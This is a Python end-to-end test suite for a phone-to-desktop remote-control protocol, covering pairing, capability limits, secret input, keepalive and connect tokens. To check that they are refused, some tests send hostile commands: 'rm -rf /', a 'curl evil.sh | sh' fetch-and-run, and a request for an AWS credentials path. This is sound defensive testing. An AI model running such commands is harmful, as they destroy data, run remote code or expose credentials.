# SPDX-License-Identifier: AGPL-3.0-or-later
"""End to end: a client pairs through the rendezvous and drives a pane (RRP/1).

Everything runs in one process over real sockets — a real WebSocket, a real Noise session and the
real relay — so what is tested is the thing that ships, not a stub of it.
"""
import asyncio
import base64
import contextlib
import json
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

from remote import client as client_mod
from remote import host as host_mod
from remote import identity as identity_mod
from remote import panes as panes_mod
from remote import pairing, wire
from rendezvous.server import Store, build


def run(coroutine, timeout=30):
    return asyncio.run(asyncio.wait_for(coroutine, timeout))


class Harness:
    """A rendezvous, a desktop and whatever clients a test wants."""

    def __init__(self, capability=wire.AGENT, approve=True, reconnect=None):
        self.capability = capability
        self.approve = approve
        self.requests = []
        # (min, max) seconds for the hub's reconnect back-off, shrunk so a test that drops the
        # link does not wait the real first second out.
        self.reconnect = reconnect

    async def __aenter__(self):
        self.temporary = tempfile.TemporaryDirectory()
        directory = Path(self.temporary.name)
        self.store = Store(":memory:")
        self.server = build(self.store)
        await self.server.start("127.0.0.1", 0)
        self.base = f"http://127.0.0.1:{self.server.port}"

        self.identity = identity_mod.Identity.create(directory)
        self.devices = identity_mod.DeviceStore(directory)
        self.source = panes_mod.DemoPaneSource()

        async def approver(request):
            self.requests.append(request)
            return self.approve, self.capability

        self.host = host_mod.Host(self.identity, self.devices, self.source,
                                  app_base="https://app.example", approver=approver,
                                  name="test desktop")
        if self.reconnect is not None:
            self.host.reconnect_min, self.host.reconnect_max = self.reconnect
        self.links: list[tuple[bool, str]] = []
        self.host.on_link(lambda online, reason: self.links.append((online, reason)))
        self.counts: list[int] = []
        self.host.on_devices(self.counts.append)
        await self.host.register(self.base)
        self.serving = asyncio.create_task(self.host.serve())
        for _ in range(100):                       # wait for the outbound socket to attach
            await asyncio.sleep(0.02)
            if self.host.socket is not None:
                break
        return self

    async def __aexit__(self, *exc):
        await self.host.stop()
        self.serving.cancel()
        with __import__("contextlib").suppress(asyncio.CancelledError):
            await self.serving
        await self.server.close()
        self.store.close()
        self.temporary.cleanup()

    async def pair(self, name="Pixel 9", platform="Chrome"):
        url, room = await self.host.open_pairing()
        client = client_mod.Client(self.base)
        paired = await client.pair(url, name=name, platform=platform)
        return client, paired, url, room

    async def rendezvous_restarts(self):
        """What a rendezvous restart looks like from this end: the registry no longer holds this
        desktop, so the token it was issued is refused, and the link drops.

        The registry is emptied rather than the process replaced. Replacing it means binding the
        same port again, and an established socket survives its listener closing — so the desktop
        can reconnect to the server that is on its way out and sit there, connected to nobody,
        which is a property of the test and not of the code under it.
        """
        self.store.db.execute("DELETE FROM desktops")
        self.store.db.commit()
        if self.host.socket is not None:
            await self.host.socket.close()

    async def until(self, predicate, timeout=20.0, what="the condition"):
        loop = asyncio.get_running_loop()
        deadline = loop.time() + timeout
        while not predicate():
            if loop.time() > deadline:
                raise AssertionError(f"{what} was never reached")
            await asyncio.sleep(0.02)

    async def desktops(self) -> int:
        import urllib.request
        def go():
            with urllib.request.urlopen(f"{self.base}/v1/health", timeout=10) as answer:
                return json.loads(answer.read())["desktops"]
        return await asyncio.to_thread(go)


class PairingTests(unittest.TestCase):
    def test_pair_then_reconnect(self):
        async def main():
            async with Harness() as harness:
                client, paired, url, _ = await harness.pair()
                self.assertEqual(paired.capability, wire.AGENT)
                self.assertEqual(len(harness.devices.live()), 1)
                # Both ends derive the same confirmation code from the handshake.
                self.assertEqual(client.auth_code, harness.requests[0].code)
                self.assertEqual(harness.requests[0].name, "Pixel 9")
                await client.close()

                again = client_mod.Client(harness.base)
                welcome = await again.connect(paired)
                self.assertEqual(welcome["capability"], wire.AGENT)
                self.assertEqual(welcome["desktop"]["id"], harness.identity.desktop_id)
                panes = await again.expect("panes")
                self.assertEqual(len(panes["items"]), 2)
                await again.close()
        run(main())

    def test_a_refused_device_is_not_pinned(self):
        async def main():
            async with Harness(approve=False) as harness:
                url, _ = await harness.host.open_pairing()
                client = client_mod.Client(harness.base)
                with self.assertRaises(wire.WireError):
                    await client.pair(url, name="attacker", platform="curl")
                self.assertEqual(harness.devices.live(), [])
                await client.close()
        run(main())

    def test_the_pairing_secret_is_single_use(self):
        async def main():
            async with Harness() as harness:
                url, _ = await harness.host.open_pairing()
                first = client_mod.Client(harness.base)
                await first.pair(url, name="phone", platform="Chrome")
                await first.close()
                second = client_mod.Client(harness.base)
                with self.assertRaises(wire.WireError):
                    await second.pair(url, name="thief", platform="Chrome")
                await second.close()
                self.assertEqual(len(harness.devices.live()), 1)
        run(main())

    def test_a_wrong_secret_burns_the_room(self):
        async def main():
            async with Harness() as harness:
                url, room = await harness.host.open_pairing()
                bad = url.split("&s=")[0] + "&s=" + pairing.b64(b"\x00" * 16) + "&r=" + room.room
                attacker = client_mod.Client(harness.base)
                with self.assertRaises(wire.WireError):
                    await attacker.pair(bad, name="thief", platform="Chrome")
                await attacker.close()
                owner = client_mod.Client(harness.base)
                with self.assertRaises(wire.WireError):
                    await owner.pair(url, name="phone", platform="Chrome")
                await owner.close()
        run(main())

    def test_an_unpaired_device_cannot_connect(self):
        async def main():
            async with Harness() as harness:
                stranger = client_mod.Paired(desktop_public=harness.identity.public,
                                             device_id="deadbeef", capability=wire.FULL,
                                             static_private=__import__("os").urandom(32),
                                             desktop_id=harness.identity.desktop_id)
                client = client_mod.Client(harness.base)
                with self.assertRaises((client_mod.PinMismatch, wire.WireError,
                                        asyncio.TimeoutError, OSError)):
                    await client.connect(stranger)
                await client.close()
        run(main())

    def test_a_substituted_desktop_key_is_refused(self):
        """A client pins the desktop key; there is no path that accepts a different one."""
        async def main():
            async with Harness() as harness:
                _, paired, _, _ = await harness.pair()
                from remote import noise
                impostor = client_mod.Paired(
                    desktop_public=noise.generate_keypair()[1], device_id=paired.device_id,
                    capability=paired.capability, static_private=paired.static_private,
                    desktop_id=harness.identity.desktop_id)
                client = client_mod.Client(harness.base)
                with self.assertRaises((client_mod.PinMismatch, wire.WireError,
                                        asyncio.TimeoutError, OSError)):
                    await client.connect(impostor)
                await client.close()
        run(main())


class CapabilityTests(unittest.TestCase):
    def test_a_view_device_cannot_compose(self):
        async def main():
            async with Harness(capability=wire.VIEW) as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "compose", "pane": "pane-1", "text": "rm -rf /"})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                await client.close()
        run(main())

    def test_an_agent_device_cannot_reach_the_shell(self):
        """`agent` is not a licence to run commands: compose is forced to the agent."""
        async def main():
            async with Harness(capability=wire.AGENT) as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "compose", "pane": "pane-1", "text": "curl evil.sh | sh",
                                   "agent": False})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                await client.close()
        run(main())

    def test_an_agent_device_may_steer_the_running_turn(self):
        """`when: "steer"` is the third door of the composer, and the owner's rule for a paired
        device is "model switch and steer at AGENT" (2026-09-19). It reaches the desktop as it was
        sent — the hub decides who may steer, never what a steer means."""
        async def main():
            async with Harness(capability=wire.AGENT) as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                seen = []

                async def record(pane, text, *, to_agent, when, origin, origin_name=""):
                    seen.append({"pane": pane, "text": text, "to_agent": to_agent, "when": when,
                                 "origin": origin})

                harness.source.compose = record
                await client.send({"t": "compose", "pane": "pane-1", "text": "check the readme",
                                   "when": "steer"})
                for _ in range(200):
                    if seen:
                        break
                    await asyncio.sleep(0.02)
                self.assertEqual(seen, [{"pane": "pane-1", "text": "check the readme",
                                         "to_agent": True, "when": "steer",
                                         "origin": f"remote:{paired.device_id}"}])
                # And a `when` that is neither of the three is still refused, by name.
                await client.send({"t": "compose", "pane": "pane-1", "text": "x", "when": "later"})
                error = await client.expect("error")
                self.assertEqual(error["code"], "unknown_type")
                self.assertEqual(len(seen), 1)
                await client.close()
        run(main())

    def test_a_view_device_cannot_steer(self):
        """Steering is typing here, so the level that may not type may not steer either."""
        async def main():
            async with Harness(capability=wire.VIEW) as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                seen = []

                async def record(*args, **kwargs):
                    seen.append(kwargs)

                harness.source.compose = record
                await client.send({"t": "compose", "pane": "pane-1", "text": "check the readme",
                                   "when": "steer"})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                self.assertEqual(seen, [])
                await client.close()
        run(main())

    def test_revoking_ends_a_live_session(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                harness.devices.revoke(paired.device_id)
                message = await asyncio.wait_for(client.inbox.get(), 10)
                self.assertIn(message["t"], ("revoked", "bye"))
                await client.close()
        run(main())

    def test_downgrading_applies_without_reconnecting(self):
        async def main():
            async with Harness(capability=wire.FULL) as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                harness.devices.set_capability(paired.device_id, wire.VIEW)
                await client.send({"t": "compose", "pane": "pane-1", "text": "hello"})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                await client.close()
        run(main())

    def test_forbidden_types_are_refused(self):
        async def main():
            async with Harness(capability=wire.FULL) as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                for kind in ("store_key", "configure", "import_warp", "set_model", "load_state"):
                    await client.send({"t": kind, "pane": "pane-1"})
                    error = await client.expect("error")
                    self.assertEqual(error["code"], "not_permitted", kind)
                await client.close()
        run(main())

    def test_plan_execute_refuses_a_path(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "plan_execute", "pane": "pane-1",
                                   "plan_id": "/home/elliott/.aws/credentials"})
                error = await client.expect("error")
                self.assertIn(error["code"], ("unknown_type", "not_permitted"))
                await client.close()
        run(main())


class StreamTests(unittest.TestCase):
    def test_a_prompt_from_the_phone_drives_a_turn(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "pane_focus", "pane": "pane-1"})
                await client.send({"t": "compose", "pane": "pane-1",
                                   "text": "why does the router send this to the shell?"})

                seen, deltas = set(), []
                deadline = asyncio.get_event_loop().time() + 20
                while "agent_finished" not in seen:
                    left = deadline - asyncio.get_event_loop().time()
                    message = await asyncio.wait_for(client.inbox.get(), max(left, 0.1))
                    if message["t"] != "agent":
                        continue
                    name = message["event"]["event"]
                    seen.add(name)
                    if name == "delta":
                        deltas.append(message["event"]["text"])
                self.assertIn("agent_started", seen)
                self.assertIn("tool_started", seen)
                self.assertIn("agent_finished", seen)
                self.assertIn("router", "".join(deltas))
                # The prompt is attributed to the device that sent it.
                await client.close()
        run(main())

    def test_withheld_events_never_reach_a_client(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "pane_focus", "pane": "pane-1"})
                await asyncio.sleep(0.1)
                for name in ("key_stored", "presets", "configured", "state_loaded"):
                    harness.source._emit("pane-1", {"event": name, "secret": "sk-live-123"})
                harness.source._emit("pane-1", {"event": "status", "text": "marker"})
                while True:
                    message = await asyncio.wait_for(client.inbox.get(), 10)
                    if message["t"] == "agent" and message["event"].get("text") == "marker":
                        break
                    if message["t"] == "agent":
                        self.assertTrue(wire.may_forward(message["event"]["event"]),
                                        message["event"]["event"])
                await client.close()
        run(main())

    def test_a_tool_result_reaches_the_phone_with_its_label_and_diff(self):
        # Protocol section 23 rides on two events a phone already sees, and the hub forwards a
        # worker event verbatim: `label`, `ms` and `diff` therefore need no new allow-list entry,
        # and none is added. Nothing about the shape of what a phone may see changes either - a
        # write's diff is the same file text `tool_started.preview` has carried all along.
        #
        # This harness is the **transcript-only** shape: DemoPaneSource has no `on_screen`, so the
        # hub advertises no `screen` and the client draws the agent-companion transcript, which is
        # the one surface that renders a tool's own output. That is why the two tool events still
        # arrive here while a share carrying the screen is sent neither (#3H5T, protocol 6.4;
        # the screen side is `test_tool_text_is_not_sent_to_a_client_that_draws_the_screen` in
        # tests/test_remote_gui_host.py).
        label = {"kind": "edit", "running": "editing x.py", "title": "edited x.py",
                 "stats": ["+1 −1"], "ok": True, "path": "src/x.py", "inline_diff": True,
                 "open": {"type": "fold"}}

        async def main():
            async with Harness() as harness:
                self.assertFalse(harness.host.screens)     # no on_screen: the transcript shape
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "pane_focus", "pane": "pane-1"})
                await asyncio.sleep(0.1)
                harness.source._emit("pane-1", {"event": "tool_output", "call_id": "c1",
                                                "text": "one\ntwo\n"})
                message = await asyncio.wait_for(client.inbox.get(), 10)
                while message["t"] != "agent" or message["event"]["event"] != "tool_output":
                    message = await asyncio.wait_for(client.inbox.get(), 10)
                self.assertEqual(message["event"]["text"], "one\ntwo\n")
                harness.source._emit("pane-1", {
                    "event": "tool_result", "tool": "edit_file", "call_id": "c1", "ms": 60,
                    "result": {"path": "src/x.py", "added": 1, "removed": 1},
                    "diff": "--- a/src/x.py\n+++ b/src/x.py\n-old = 1\n+new = 1\n",
                    "label": label})
                while True:
                    message = await asyncio.wait_for(client.inbox.get(), 10)
                    if message["t"] == "agent" and message["event"]["event"] == "tool_result":
                        break
                event = message["event"]
                self.assertEqual(event["label"], label)
                self.assertEqual(event["ms"], 60)
                self.assertIn("+new = 1", event["diff"])
                await client.close()
        run(main())

    def test_resume_replays_what_was_missed(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                panes = await client.expect("panes")
                seq = panes["seq"]
                await client.close()

                harness.source.set_status("pane-1", "running")
                harness.source.set_status("pane-1", "failed")
                await asyncio.sleep(0.1)

                back = client_mod.Client(harness.base)
                await back.connect(paired)
                await back.expect("panes")
                await back.send({"t": "resume", "streams": {"panes": seq},
                                 "hub_epoch": harness.host.epoch})
                resumed = await back.expect("resumed")
                self.assertGreaterEqual(resumed["streams"]["panes"], 2)
                await back.close()
        run(main())

    def test_a_stale_epoch_asks_for_a_restart(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "resume", "streams": {"panes": 3},
                                   "hub_epoch": "from-a-previous-process"})
                resumed = await client.expect("resumed")
                self.assertTrue(resumed["restart"])
                await client.close()
        run(main())


class RendezvousTests(unittest.TestCase):
    def test_registering_needs_the_private_key(self):
        async def main():
            async with Harness() as harness:
                import base64
                import urllib.request
                from remote import noise

                def post(path, payload):
                    request = urllib.request.Request(
                        harness.base + path, data=__import__("json").dumps(payload).encode(),
                        headers={"Content-Type": "application/json"}, method="POST")
                    try:
                        with urllib.request.urlopen(request, timeout=10) as response:
                            return response.status, __import__("json").loads(response.read())
                    except urllib.error.HTTPError as error:
                        return error.code, {}

                status, body = await asyncio.to_thread(post, "/v1/challenge", {})
                self.assertEqual(status, 200)
                # The victim's public key with a made-up proof must not register.
                status, _ = await asyncio.to_thread(
                    post, "/v1/register",
                    {"static_pubkey": base64.b64encode(harness.identity.public).decode(),
                     "challenge": body["challenge"], "proof": "00" * 32})
                self.assertEqual(status, 401)
        run(main())

    def test_the_desktop_id_is_bound_to_the_key(self):
        from rendezvous.server import derive_desktop_id
        import base64
        from remote import noise
        _, public = noise.generate_keypair()
        encoded = base64.b64encode(public).decode()
        self.assertEqual(derive_desktop_id(encoded), derive_desktop_id(encoded))
        self.assertEqual(len(derive_desktop_id(encoded)), 32)
        self.assertEqual(derive_desktop_id("not base64"), "")


if __name__ == "__main__":
    unittest.main()


class SecretInputTests(unittest.TestCase):
    """Password entry from a phone: nonce lifecycle, per-device switch, the audit line."""

    @staticmethod
    async def _paired(harness):
        client, paired, _, _ = await harness.pair(name="Pixel 9", platform="Chrome")
        return client, paired

    def test_the_nonce_roundtrip(self):
        async def main():
            async with Harness(capability=wire.FULL) as harness:
                client, paired = await self._paired(harness)
                harness.devices.set_password_entry(paired.device_id, True)
                harness.source.set_password_prompt("pane-1", True, shell_pid=11, foreground_pid=22)
                panes = await client.expect("panes")
                entry = next(item for item in panes["items"] if item["id"] == "pane-1")
                self.assertEqual(entry["status"], "password")
                nonce = entry["secret_nonce"]
                self.assertTrue(nonce)

                await client.send({"t": "secret_input", "pane": "pane-1", "nonce": "wrong",
                                   "bytes": "cGFzcw=="})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("agent")
                self.assertEqual(caught.exception.code, "not_permitted")

                await client.send({"t": "secret_input", "pane": "pane-1", "nonce": nonce,
                                   "bytes": "cGFzcw=="})
                reply = await client.expect("agent")
                self.assertEqual(reply["event"]["text"], "Password sent.")
                self.assertEqual(harness.source._secrets, [("pane-1", b"pass")])

                # Single use: the same nonce cannot write a second line.
                await client.send({"t": "secret_input", "pane": "pane-1", "nonce": nonce,
                                   "bytes": "cGFzcw=="})
                with self.assertRaises(wire.WireError):
                    await client.expect("agent")
                await client.close()
        run(main())

    def test_a_device_without_the_switch_is_refused(self):
        async def main():
            async with Harness(capability=wire.FULL) as harness:
                client, paired = await self._paired(harness)
                harness.source.set_password_prompt("pane-1", True, shell_pid=11, foreground_pid=22)
                await client.expect("panes")
                nonce = harness.host.secret_nonces["pane-1"].value
                await client.send({"t": "secret_input", "pane": "pane-1", "nonce": nonce,
                                   "bytes": "cGFzcw=="})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("agent")
                self.assertEqual(caught.exception.code, "not_permitted")
                self.assertEqual(harness.source._secrets, [])
                await client.close()
        run(main())

    def test_an_ended_prompt_refuses_even_a_live_nonce(self):
        async def main():
            async with Harness(capability=wire.FULL) as harness:
                client, paired = await self._paired(harness)
                harness.devices.set_password_entry(paired.device_id, True)
                harness.source.set_password_prompt("pane-1", True, shell_pid=11, foreground_pid=22)
                await client.expect("panes")
                nonce = harness.host.secret_nonces["pane-1"].value
                harness.source.set_password_prompt("pane-1", False)
                await client.send({"t": "secret_input", "pane": "pane-1", "nonce": nonce,
                                   "bytes": "cGFzcw=="})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("agent")
                self.assertEqual(caught.exception.code, "not_permitted")
                self.assertEqual(harness.source._secrets, [])
                await client.close()
        run(main())

    def test_a_new_prompt_mints_a_new_nonce(self):
        async def main():
            async with Harness(capability=wire.FULL) as harness:
                client, paired = await self._paired(harness)
                harness.devices.set_password_entry(paired.device_id, True)
                harness.source.set_password_prompt("pane-1", True, shell_pid=11, foreground_pid=22)
                await client.expect("panes")
                first = harness.host.secret_nonces["pane-1"].value
                harness.source.set_password_prompt("pane-1", False)
                harness.source.set_password_prompt("pane-1", True, shell_pid=11, foreground_pid=33)
                await client.expect("panes")
                second = harness.host.secret_nonces["pane-1"].value
                self.assertNotEqual(first, second)
                self.assertEqual(harness.host.secret_nonces["pane-1"].foreground_pid, 33)
                await client.close()
        run(main())

    def test_the_audit_log_records_the_shape_not_the_password(self):
        async def main():
            async with Harness(capability=wire.FULL) as harness:
                client, paired = await self._paired(harness)
                harness.devices.set_password_entry(paired.device_id, True)
                harness.source.set_password_prompt("pane-1", True, shell_pid=11, foreground_pid=22)
                await client.expect("panes")
                nonce = harness.host.secret_nonces["pane-1"].value
                await client.send({"t": "secret_input", "pane": "pane-1", "nonce": nonce,
                                   "bytes": "c2VjcmV0LXBhc3N3b3Jk"})
                await client.expect("agent")
                path = next(harness.devices.directory.glob("audit-*.jsonl"))
                text = path.read_text()
                lines = [json.loads(line) for line in text.splitlines()]
                kinds = [line["kind"] for line in lines]
                self.assertIn("pair", kinds)
                self.assertIn("prompt_detected", kinds)
                self.assertIn("secret_input", kinds)
                self.assertNotIn("secret-password", text)
                await client.close()
        run(main())


class TransportSwitchTests(unittest.TestCase):
    def test_the_handshake_acks_the_exact_next_frame(self):
        async def main():
            async with Harness() as harness:
                client, _, _, _ = await harness.pair()
                effective = await client.transport_switch()
                self.assertGreaterEqual(effective, 1)
                await client.close()
        run(main())

    def test_a_gap_is_refused(self):
        async def main():
            async with Harness() as harness:
                client, _, _, _ = await harness.pair()
                await client.send({"t": "transport_switch", "next_seq": 1})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("transport_switched")
                self.assertEqual(caught.exception.code, "stale_seq")
                # The session survives: a correct offer after a refused one still acks.
                effective = await client.transport_switch()
                self.assertGreaterEqual(effective, 2)
                await client.close()
        run(main())


class AlwaysOnLinkTests(unittest.TestCase):
    """The rendezvous link, held open for a working day (§8.1).

    Always-on turns one outbound socket into the thing the phone depends on all day, so the two
    ways it used to stop coming back are pinned here: a rendezvous that restarted has forgotten
    the token it issued, and a loop that kept dialing with that token would be refused 4401 until
    the app was restarted; and nothing outside the hub could tell whether the link was up, so the
    GUI had nothing to show but a share button.
    """

    def test_a_rendezvous_that_forgot_this_desktop_is_registered_with_again(self):
        async def main():
            async with Harness(reconnect=(0.05, 0.2)) as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                first = harness.host.token
                self.assertEqual(harness.links[-1], (True, ""))

                await harness.rendezvous_restarts()
                self.assertFalse(
                    harness.store.authenticate(harness.identity.desktop_id, first),
                    "the token it holds is not one the rendezvous knows any more")
                await harness.until(lambda: harness.host.token != first,
                                    what="a fresh token")
                await harness.until(lambda: harness.host.socket is not None,
                                    what="the socket back up")
                await harness.until(lambda: harness.links[-1][0], what="the link reported up")

                # It was reported down, with one sentence, and then up again.
                self.assertIn(False, [online for online, _ in harness.links])
                down = [reason for online, reason in harness.links if not online][-1]
                self.assertTrue(down and down.endswith("."), down)
                self.assertEqual(harness.links[-1], (True, ""))
                # It never moved: the desktop is at the same rendezvous, not at some fallback.
                self.assertEqual(harness.host.rendezvous, harness.base)
                self.assertEqual(harness.host.tokens[harness.base], harness.host.token)
                for _ in range(200):          # the upgrade lands before the attach does
                    if await harness.desktops() == 1:
                        break
                    await asyncio.sleep(0.05)
                self.assertEqual(await harness.desktops(), 1)
                self.assertTrue(harness.store.authenticate(harness.identity.desktop_id,
                                                           harness.host.token))

                # And the phone paired before the restart still reaches it.
                again = client_mod.Client(harness.base)
                await again.connect(paired)
                await again.expect("panes")
                await again.close()
        run(main(), timeout=90)

    def test_the_owners_devices_are_counted_while_they_are_connected(self):
        async def main():
            async with Harness(reconnect=(0.05, 0.2)) as harness:
                self.assertEqual(harness.host.devices_online(), 0)
                first, record, _, _ = await harness.pair()
                await first.close()
                phone = client_mod.Client(harness.base)
                await phone.connect(record)
                await phone.expect("panes")
                await harness.until(lambda: harness.host.devices_online() == 1,
                                    what="the phone counted")

                # A second paired device is a second connection, and the same device twice is
                # still one device: the count is of devices, not of channels.
                tablet_pairing, tablet, _, _ = await harness.pair(name="iPad", platform="Safari")
                await tablet_pairing.close()
                second = client_mod.Client(harness.base)
                await second.connect(tablet)
                await second.expect("panes")
                await harness.until(lambda: harness.host.devices_online() == 2,
                                    what="both devices counted")

                await phone.close()
                await harness.until(lambda: harness.host.devices_online() == 1,
                                    what="the phone dropped")
                self.assertEqual(harness.counts[-1], 1)
                await second.close()
                await harness.until(lambda: harness.host.devices_online() == 0,
                                    what="both gone")
        run(main(), timeout=90)

    def test_a_silent_link_is_pinged_from_both_ends(self):
        """The Cloudflare Tunnel in front of the hosted rendezvous closes a WebSocket that has
        been silent for about two minutes, and an idle link sent nothing at all: the desktop went
        offline every 125 s, taking every phone on it along. Now the hub pings the rendezvous,
        and the rendezvous pings the desktop and every phone, each answered with a pong."""
        from remote import ws
        frames: list[tuple[int, int, bool]] = []      # (socket id, opcode, masked = client side)
        original = ws.WebSocket._send_frame

        async def recording(socket, opcode, payload):
            frames.append((id(socket), opcode, socket._mask))
            return await original(socket, opcode, payload)

        async def main():
            async with Harness(reconnect=(0.05, 0.2)) as harness:
                first, record, _, _ = await harness.pair()
                await first.close()
                phone = client_mod.Client(harness.base)
                await phone.connect(record)
                await phone.expect("panes")
                hub = id(harness.host.socket)
                frames.clear()
                await harness.until(
                    lambda: {(hub, ws.OP_PING), (hub, ws.OP_PONG)}
                    <= {(s, op) for s, op, _ in frames}
                    # The rendezvous's side (unmasked) pings two sockets, the desktop's and the
                    # phone's, and both client ends (masked) answer.
                    and len({s for s, op, masked in frames if op == ws.OP_PING and not masked}) >= 2
                    and len({s for s, op, masked in frames if op == ws.OP_PONG and masked}) >= 2,
                    timeout=10, what="pings both ways, each answered")
                # Nobody's link dropped for it: the ping is below the application.
                self.assertEqual(harness.links[-1], (True, ""))
                self.assertEqual(id(harness.host.socket), hub)
                await phone.close()

        with mock.patch.object(ws, "KEEPALIVE_SECONDS", 0.05), \
                mock.patch.object(ws.WebSocket, "_send_frame", recording):
            run(main(), timeout=60)


class ConnectTokenTests(unittest.TestCase):
    """Section 8 from the desktop's side: the token is minted at pairing, handed over in `paired`
    and again in every `welcome`, stored with the record, and presented by the Python client —
    which is what a laptop's Relay uses to open a shared pane."""

    def test_pairing_hands_over_a_token_the_client_presents(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                self.assertTrue(paired.connect_token)
                device = harness.devices.devices[paired.device_id]
                self.assertEqual(pairing.check_connect_token(
                    harness.identity.connect_secret, harness.identity.desktop_id,
                    paired.device_id, paired.connect_token), device.connect_token_id)
                # The record round-trips through the file a viewer keeps.
                self.assertEqual(client_mod.Paired.from_json(paired.to_json()).connect_token,
                                 paired.connect_token)
                again = client_mod.Client(harness.base)
                self.assertIn("&ct=", again._url(desktop=harness.identity.desktop_id,
                                                  device=paired.device_id,
                                                  connect_token=paired.connect_token))
                welcome = await again.connect(paired)
                self.assertEqual(welcome["connect_token"], paired.connect_token)
                await again.close()
                # A record from before tokens existed — the same file without the field — is
                # refused at the rendezvous exactly as a stranger is; there is no shim.
                old = client_mod.Paired.from_json(json.dumps({
                    key: value for key, value in json.loads(paired.to_json()).items()
                    if key != "connect_token"}))
                self.assertEqual(old.connect_token, "")
                stale = client_mod.Client(harness.base)
                with self.assertRaises(Exception):
                    await stale.connect(old)
                await stale.close()
        run(main())

    def test_a_rendezvous_that_restarted_learns_the_revoked_ids_again(self):
        """Registration carries every revoked id, so a rendezvous with an empty database is
        told what to refuse before the hub's next channel — including a device revoked while
        the rendezvous was down, whose `/v1/revoke` never arrived."""
        async def main():
            async with Harness(reconnect=(0.05, 0.1)) as harness:
                desktop_id = harness.identity.desktop_id
                keep, kept, _, _ = await harness.pair(name="keep")
                drop, dropped, _, _ = await harness.pair(name="drop")
                await keep.close()
                await drop.close()
                await harness.rendezvous_restarts()
                # Revoked while the registry is empty: the rendezvous cannot be told now.
                harness.devices.revoke(dropped.device_id)
                token_id = harness.devices.devices[dropped.device_id].connect_token_id
                await harness.until(lambda: harness.host.socket is not None
                                    and harness.store.desktop_exists(desktop_id),
                                    what="re-registration")
                await harness.until(lambda: harness.store.token_revoked(desktop_id, token_id),
                                    what="the revoked id after re-registration")
                self.assertIsNotNone(harness.store.connect_secret(desktop_id))
                stale = client_mod.Client(harness.base)
                with self.assertRaises(Exception):
                    await stale.connect(dropped)
                await stale.close()
                fresh = client_mod.Client(harness.base)
                await fresh.connect(kept)
                await fresh.close()
        run(main())
